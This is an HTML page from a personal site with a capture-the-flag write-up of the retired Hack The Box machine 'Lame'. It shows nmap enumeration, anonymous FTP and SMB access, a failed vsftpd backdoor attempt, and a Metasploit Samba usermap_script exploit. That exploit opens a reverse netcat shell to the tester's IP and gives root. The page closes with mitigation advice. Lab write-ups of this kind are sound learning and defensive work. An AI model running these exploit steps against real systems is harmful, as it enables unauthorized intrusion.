@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A</title>
+    <link rel="icon" href="../images/icons/A.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+
+</head>
+<body>
+    <div class="topnav">
+        <div class="logo">
+            <h2>Analogman</h2>
+        </div>
+        <div class="social-links">
+            <a href="https://youtu.be/9J62hGda9BQ?si=FGMES2gz8cWz9U3k" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+        </div>
+
+        <div class="menu-icon" onclick="toggleMenu()">
+            <i class="fa fa-bars"></i>
+        </div>
+        <!-- Menú desplegable que estará oculto por defecto -->
+        <ul class="navbar">
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="#">Tags</a></li>
+            <li><a href="../wp/index.html">WriteUps</a></li>
+        </ul>
+    </div>
+    <script>
+        function toggleMenu() {
+            const navbar = document.querySelector('.navbar');
+            navbar.classList.toggle('open');  
+        }
+    </script>
+    <div class="header">
+        <div class="wrapper">
+            <div class="sidebar">
+                <div class="profile">
+                    <img src="../images/profile.jpg" alt="">
+                    <h2>Analogman</h2>
+                    <h5>Hacker learner</h5>
+                </div>
+                <ul class="navbar">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="#">Tags</a></li>
+                    <li><a href="../wp/index.html">WriteUps</a></li>
+                </ul>
+                <div class="social">
+                    <a href="https://www.youtube.com/watch?v=9J62hGda9BQ" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+                </div>
+            </div>
+
+            <!-- writeups aquí -->
+            <div class="writeup-container">
+                <h1>Lame WriteUp</h1>
+                
+                <section class="content">
+                    <!-- Texto explicativo -->
+                    <div class="img-container">
+                        <img src="../images/Posts/Lame/Lame_Description.png" alt="Preview" class="machine-image">
+                    </div>
+                    <h1>1. Description</h1>
+                    <p>Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.</p>
+                    <h1>2. Methodology</h1>
+                    <p>The methodology followed for this security assessment is based on a structured and systematic approach, with the aim of identifying and assessing vulnerabilities present in the FTP and Samba services. This analysis is aligned with recognized industry standards, such as the OWASP Testing Guide and NIST best practices, and is developed in the following phases:</p>
+                    <h2>2.1 Recognition</h2>
+                    <p>In this phase, the necessary information was gathered to identify running services, versions, and potential misconfigurations. Techniques used included:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>Port Scanning</strong>: A scan was performed using tools such as Nmap to identify active services and their versions.</li>
+                            <li><strong>Banner Grabbing</strong>: Details of specific FTP and Samba versions were obtained using banner grabbing techniques.</li>
+                        </ul>
+                    </div>
+                    <h2>2.2 Vulnerability Analysis</h2>
+                    <p>Once the services and versions were identified, a vulnerability analysis was carried out to detect possible security flaws in outdated versions or incorrect configurations. The following were used:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>Automated scanning</strong>: Tools such as searchsploit or Metasploit to identify known vulnerabilities and obtain a preliminary analysis.</li>
+                            <li><strong>Manual investigation</strong>: Manual review of specific versions and search for relevant CVEs (Common Vulnerabilities and Exposures).</li>
+                        </ul>
+                    </div>
+                    <h2>2.3 Exploitation</h2>
+                    <p>To confirm the vulnerabilities found and assess their impact, controlled exploitation tests were performed. The steps include:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>Unauthorized access testing</strong>: Anonymous and read/write access was verified for both services.</li>
+                            <li><strong>Privilege escalation simulation</strong>: Vulnerabilities were assessed to see if they allowed commands to be executed with higher privileges on the system.</li>
+                        </ul>
+                    </div>
+                    <h2>2.4 Post-Exploitation and Impact Assessment</h2>
+                    <p>Se analizaron las consecuencias potenciales de una explotación exitosa, considerando cómo podrían afectar la seguridad de otros sistemas en la red. Esta fase incluyó:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>System Impact Assessment</strong>: Analysis of the effects on the confidentiality, integrity, and availability of data on the server.</li>
+                            <li><strong>Lateral Movement Simulation</strong>: Exploration of possible attack paths to other connected systems.</li>
+                        </ul>
+                    </div>
+                    <h2>2.5 Documentation and Recommendations</h2>
+                    <p>The final phase involved documenting the findings, prioritizing them according to their risk level, and developing specific recommendations to mitigate the detected vulnerabilities.</p>
+                    <h1>3. Enumeration</h1>
+                    <p>To begin the port enumeration phase, we will use the Nmap tool, which is open source and widely used in networking and computer security to explore, map networks, and discover services on open ports. In this case, we perform a scan with the following parameters:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>-v:</strong> Enables verbose mode, which provides more information about the scanning process.</li>
+                            <li><strong>-n:</strong> Prevents DNS resolution of IP addresses, which is useful to avoid additional wait times on networks that do not have DNS configurations.</li>
+                            <li><strong>-Pn:</strong> Disables sending a ping before performing the scan, useful when hosts are configured not to respond to ping requests.</li>
+                            <li><strong>-sCV:</strong> Runs the default Nmap scripts (NSE) and detects the versions of the services that are running on the open ports.</li>
+                        </ul>
+                    </div>
+                    <p>With these parameters, detailed information about the open ports and the services associated with them will be obtained, which will allow us to plan the next phase of exploitation.</p>
+                    <h2>3.1 Port Scanning</h2>
+                    <p>Run the command <em>"nmap -v -n -Pn 10.129.120.160"</em>:</p>
+                    <!-- Código con formato de consola -->
+                    <div class="console-code">
+                        <pre>
+$ sudo nmap -v -n -Pn 10.129.120.160
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 08:56 EST
+Initiating SYN Stealth Scan at 08:56
+Scanning 10.129.120.160 [1000 ports]
+Discovered open port 445/tcp on 10.129.120.160
+Discovered open port 22/tcp on 10.129.120.160
+Discovered open port 139/tcp on 10.129.120.160
+Discovered open port 21/tcp on 10.129.120.160
+Completed SYN Stealth Scan at 08:56, 4.65s elapsed (1000 total ports)
+Nmap scan report for 10.129.120.160
+Host is up (0.038s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds
+Raw packets sent: 1999 (87.956KB) | Rcvd: 7 (308B)
+                        </pre>
+                    </div>
+                    <p>Once the open ports have been discovered, we proceed to list the versions:</p>
+                    <div class="console-code">
+                        <pre>
+$ sudo nmap -v -n -sCV -Pn -p 21,22,139,445 10.129.120.160
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 09:02 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 09:02
+Completed NSE at 09:02, 0.00s elapsed
+Initiating NSE at 09:02
+Completed NSE at 09:02, 0.00s elapsed
+Initiating NSE at 09:02
+Completed NSE at 09:02, 0.00s elapsed
+Initiating SYN Stealth Scan at 09:02
+Scanning 10.129.120.160 [4 ports]
+Discovered open port 21/tcp on 10.129.120.160
+Discovered open port 139/tcp on 10.129.120.160
+Discovered open port 445/tcp on 10.129.120.160
+Discovered open port 22/tcp on 10.129.120.160
+Completed SYN Stealth Scan at 09:02, 0.05s elapsed (4 total ports)
+Initiating Service scan at 09:02
+Scanning 4 services on 10.129.120.160
+Completed Service scan at 09:02, 11.85s elapsed (4 services on 1 host)
+NSE: Script scanning 10.129.120.160.
+Initiating NSE at 09:02
+NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
+Completed NSE at 09:02, 40.09s elapsed
+Initiating NSE at 09:02
+Completed NSE at 09:02, 0.28s elapsed
+Initiating NSE at 09:02
+Completed NSE at 09:02, 0.00s elapsed
+Nmap scan report for 10.129.120.160
+Host is up (0.038s latency).
+
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.48
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2h29m46s, deviation: 3h32m10s, median: -15s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2024-11-07T09:02:03-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+NSE: Script Post-scanning.
+Initiating NSE at 09:02
+Completed NSE at 09:02, 0.00s elapsed
+Initiating NSE at 09:02
+Completed NSE at 09:02, 0.00s elapsed
+Initiating NSE at 09:02
+Completed NSE at 09:02, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.54 seconds
+Raw packets sent: 4 (176B) | Rcvd: 4 (176B)  
+                        </pre>
+                    </div>
+                    <h2>3.2 Services detection</h2>
+                    <p>Open ports are discovered with their respective services and versions:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li>21/tcp: FTP (vsFTPd 2.3.4, allows anonymous authentication)</li>
+                            <li>22/tcp: SSH (OpenSSH 4.7p1)</li>
+                            <li>139/tcp y 445/tcp: Samba (Samba 3.0.20)</li>
+                        </ul>
+                    </div>
+                    <h1>4. Exploitation</h1>
+                    <p>A search for vulnerabilities associated with the versions of the services running on the target machine shows us:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>FTP</strong>: vsFTPd 2.3.4 allows anonymous authentication and has been found to have a backdoor vulnerability (CVE-2011-2523).</li>
+                            <li><strong>SMB</strong>: The Samba version has a remote command execution vulnerability, CVE-2007-2447.</li>
+                        </ul>
+                    </div>
+                    <h2>4.1 vsFTPd 2.3.4 vulnerability (CVE-2011-2523)</h2>
+                    <h3>Vulnerability description</h3>
+                    <p>The CVE-2011-2523 vulnerability affects the vsftpd (Very Secure FTP Daemon) service in version 2.3.4. It is due to a backdoor introduced in the source code of vsftpd 2.3.4 distributed on certain unofficial download servers. This backdoor allows an attacker to connect to the server and gain access to the system as the root user.</p>
+                    <h3>Impact</h3>
+                    <p>This vulnerability has a <strong>critical</strong> impact due to the following reasons:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>Full system compromise</strong>: The backdoor grants the attacker full root access, allowing them to execute commands and access all information on the server.</li>
+                            <li><strong>Risk of escalation and pivoting</strong>: With root access, the attacker can compromise other connected systems on the network or launch additional attacks.</li>
+                            <li><strong>Potential persistence</strong>: The attacker could install tools to maintain access to the system even if the vulnerability is fixed.</li>
+                        </ul>
+                    </div>
+                    <p>According to the scan result, the FTP service is configured to allow anonymous login. We can try to authenticate with the credentials <i>'anonymous:anonymous'</i>:</p>
+                    <div class="console-code">
+                        <pre>
+$ ftp 10.129.120.160
+
+Connected to 10.129.120.160.
+220 (vsFTPd 2.3.4)
+Name (10.129.120.160:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||6681|).
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
+drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
+226 Directory send OK.
+ftp> cd ..
+250 Directory successfully changed.
+ftp> pwd
+Remote directory: /
+ftp> ls
+229 Entering Extended Passive Mode (|||63018|).
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp>  
+                        </pre>
+                    </div>
+                    <p>We did not find any files to list or directories to list.</p>
+                    <p>We recall that we found vsftpd 2.3.4 of the FTP service, so we can use searchsploit to check for exploits.</p>
+                    <div class="console-code">
+                        <pre>
+$ searchsploit vsftpd 2.3.4
+
+------------------------------------------------------------ -------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ -------------------------
+vsftpd 2.3.4 - Backdoor Command Execution                   | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)      | unix/remote/17491.rb
+------------------------------------------------------------ -------------------------
+Shellcodes: No Results
+                        </pre>
+                    </div>
+                    <p>We discovered that this version of the service has a backdoor. With a simple search we verified that this vulnerability was assigned as CVE-2011-2523 and we even found instructions on how to exploit this backdoor, which we will recreate using Metasploit.</p>
+                    <p>First we open metasploit:</p>
+                    <div class="console-code">
+                        <pre>
+$ msfconsole -q 
+msf6 >
+                        </pre>
+                    </div>
+                    <p>Now we search for, select the <i>'vsftpd_234_backdoor'</i> module and configure the necessary parameters for the exploit to work:</p>
+                    <div class="console-code">
+                        <pre>
+msf6 > search vsftpd 2.3.4
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf6 > use 0
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    21               yes       The target port (TCP)
+
+
+Payload options (cmd/unix/interact):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.129.120.160
+rhosts => 10.129.120.160
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+                        </pre>
+                    </div>
+                    <p>Finally we run the exploit:</p>
+                    <div class="console-code">
+                        <pre>
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] 10.129.120.160:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.129.120.160:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+                        </pre>
+                    </div>
+                    <p>Since we didn't get a session, we proceeded to look for other exploitation opportunities on the SMB service.</p>
+                    <h2>4.2 Samba RCE vulnerability (CVE-2007-2447)</h2>
+                    <h3>Vulnerability description</h3>
+                    <p>The vulnerability CVE-2007-2447 is a command injection flaw in Samba, specifically in the username map script functionality. This affects older versions of Samba and allows remote execution of commands with the permissions of the Samba user. This is found in the Samba configuration that allows administrators to specify a user mapping script. Through a special command, crafted input can be passed to Samba, injecting arbitrary commands that Samba executes as if they were part of that script.</p>
+                    <h3>Impact</h3>
+                    <p>If the `username map script` option is enabled and an attacker has authentication access to the machine (even as a low-privilege user), they can inject commands into the username input that Samba will process. This can allow remote command execution on the server, with local privileges.</p>
+                    <p>We perform a basic enumeration of the SMB service using the smbmap tool:</p>
+                    
+                    <div class="console-code">
+                        <pre>
+$ smbmap -H 10.129.120.160 
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)                                
+                                                                                                    
+[+] IP: 10.129.120.160:445      Name: 10.129.120.160            Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        tmp                                                     READ, WRITE     oh noes!
+        opt                                                     NO ACCESS
+        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+                        </pre>
+                    </div>
+                    <p>We confirm that Samba version 3.0.20 is running on the target machine and We observed that `tmp` is accessible, which could be useful for manipulating or loading files in future exploitation stages.</p>
+                    <p>We access the share by anonymous login using the smbclient tool:</p>
+                    <div class="console-code">
+                        <pre>
+$ smbclient -N \\\\10.129.120.160\\tmp
+
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Nov  7 09:52:41 2024
+  ..                                 DR        0  Sat Oct 31 03:33:58 2020
+  .ICE-unix                          DH        0  Thu Nov  7 08:54:14 2024
+  vmware-root                        DR        0  Thu Nov  7 08:55:14 2024
+  5708.jsvc_up                        R        0  Thu Nov  7 08:55:29 2024
+  .X11-unix                          DH        0  Thu Nov  7 08:54:41 2024
+  .X0-lock                           HR       11  Thu Nov  7 08:54:41 2024
+  vgauthsvclog.txt.0                  R     1600  Thu Nov  7 08:54:12 2024
+
+                7282168 blocks of size 1024. 5385892 blocks available
+smb: \> 
+                        </pre>
+                    </div>
+                    <p>When logging in we found nothing of interest.</p>
+                    <h3>Foothold</h3>
+                    <p>We tried using searchsploit to look for any exploit related to the SMB version running on the target machine:</p>
+                    <div class="console-code">
+                        <pre>
+$ searchsploit Samba 3.0.20           
+
+------------------------------------------------------------------------------------ ------------------------------
+ Exploit Title                                                                      |  Path
+------------------------------------------------------------------------------------ ------------------------------
+Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                              | multiple/remote/10095.txt
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)    | unix/remote/16320.rb
+Samba < 3.0.20 - Remote Heap Overflow                                               | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                       | linux_x86/dos/36741.py
+------------------------------------------------------------------------------------ ------------------------------
+Shellcodes: No Results  
+                        </pre>
+                    </div>
+                    <p>We see an interesting module, namely a remote command execution (RCE), vulnerability that can be exploited using Metasploit.</p>
+                    <p>We run msfconsole again and look for the module:</p>
+                    <div class="console-code">
+                        <pre>
+$ msfconsole -q
+
+msf6 > search Samba 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+                        </pre>
+                    </div>
+                    <p>We select the module:</p>
+                    <div class="console-code">
+                        <pre>
+msf6 > use 0
+
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > 
+                        </pre>
+                    </div>
+                    <p>We configure the parameters `RHOSTS` with the target IP and `LHOST` with our IP, and execute the exploit:</p>
+                    <div class="console-code">
+                        <pre>
+msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.129.120.160
+RHOSTS => 10.129.120.160
+msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.14.48
+lhost => 10.10.14.48
+msf6 exploit(multi/samba/usermap_script) > 
+                        </pre>
+                    </div>
+                    <p>Finally, we launch the exploit by executing the run command:</p>
+                    <div class="console-code">
+                        <pre>
+msf6 exploit(multi/samba/usermap_script) > run
+
+[*] Started reverse TCP handler on 10.10.14.48:4444 
+[*] Command shell session 1 opened (10.10.14.48:4444 -> 10.129.120.160:34637) at 2024-11-07 10:18:09 -0500
+                        </pre>
+                    </div>
+                    <p>A listener is started on the designated port and shortly after we receive a callback and it seems that the exploit worked. We type the 'id' command to verify it and then 'shell' to get an interactive session.</p>
+                    <div class="console-code">
+                        <pre>
+id
+uid=0(root) gid=0(root)
+shell
+[*] Trying to find binary 'python' on the target machine
+[*] Found python at /usr/bin/python
+[*] Using `python` to pop up an interactive shell
+[*] Trying to find binary 'bash' on the target machine
+[*] Found bash at /bin/bash
+
+root@lame:/# id && ifconfig
+id && ifconfig
+uid=0(root) gid=0(root)
+eth0      Link encap:Ethernet  HWaddr 00:50:56:94:1d:dd  
+          inet addr:10.129.120.160  Bcast:10.129.255.255  Mask:255.255.0.0
+          inet6 addr: dead:beef::250:56ff:fe94:1ddd/64 Scope:Global
+          inet6 addr: fe80::250:56ff:fe94:1ddd/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:10726 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:540 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:790044 (771.5 KB)  TX bytes:70802 (69.1 KB)
+          Interrupt:19 Base address:0x2024 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:783 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:783 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:364317 (355.7 KB)  TX bytes:364317 (355.7 KB)
+
+root@lame:/# 
+                        </pre>
+                    </div>
+                    <p>We finally managed to break the Lame box and get a shell as the highest privileged user on the system, which we confirmed by running the "id && ifconfig" command.</p>
+                    <h1>5. Conclusions and Recommendations</h1>
+                    <p>Running outdated FTP and Samba services poses significant security risks due to known vulnerabilities that can be exploited. Common risks include:</p>
+                    <div class="info-box">
+                        <ol>
+                            <li><strong>Exploitation of Critical Vulnerabilities</strong>: Old versions can allow remote command execution, privilege escalation, and session hijacking.</li>
+                            <li><strong>Using the Server as an Attack Platform</strong>: Vulnerable services can be leveraged to host or distribute malware, serving as a staging point for additional attacks within the network.</li>
+                            <li><strong>Denial of Service (DoS) Attacks</strong>: Outdated versions can be targeted by overload attacks, disrupting service or degrading system performance.</li>
+                            <li><strong>Privilege Escalation and System Control</strong>: Vulnerabilities can allow an attacker to execute commands with administrative privileges, gaining full control over the system.</li>
+                            <li><strong>Unauthorized File Access</strong>: If anonymous access is not restricted, it can expose sensitive documents to unauthorized users, facilitating future attacks.</li>
+                            <li><strong>Uploading Malicious Files</strong>: Unrestricted read/write functionality can allow an attacker to upload harmful files to distribute malware or prepare attacks on the network.</li>
+                            <li><strong>Sensitive Information Collection</strong>: Anonymous access could facilitate the collection of configuration or internal structure data that can be used in privilege escalation attacks.</li>
+                        </ol>
+                    </div>
+                    <h3>Recommendations for Mitigation</h3>
+                    <p>To reduce these risks, it is recommended to implement the following measures:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li>Regularly upgrade services to secure and maintained versions.</li>
+                            <li>Limit read/write permissions to authenticated users only.</li>
+                            <li>Disable anonymous access if not required.</li>
+                            <li>Isolate the FTP server on a segmented network, minimizing its exposure.</li>
+                            <li>Implement active monitoring and alerts to detect unusual activities.</li>
+                            <li>Disable unnecessary functionalities that are not essential to the operation of the service.</li>
+                        </ul>
+                    </div>
+                    <p>Applying these measures will strengthen the security of FTP and Samba services and significantly reduce the risk associated with using outdated versions.</p>
+                    
+                    <!-- Imágenes
+                    <div class="writeup-image">
+                        <img src="../images/nothing_to_see_here.png" alt="Resultado del escaneo Nmap">
+                        <p class="caption">Figura 1: Resultado de escaneo Nmap en el host objetivo</p>
+                    </div>
+                    -->
+                </section>
+            </div>
+
+        </div>
+    </div>
+    
+    <!--Pet Cat-->
+    <div class="pet-container">
+        <img src="" alt="Walking Pet" id="pet" class="pet">
+    </div>
+    <script src="script.js"></script>
+    <!--Pet Cat-->
+</body>
+</html>
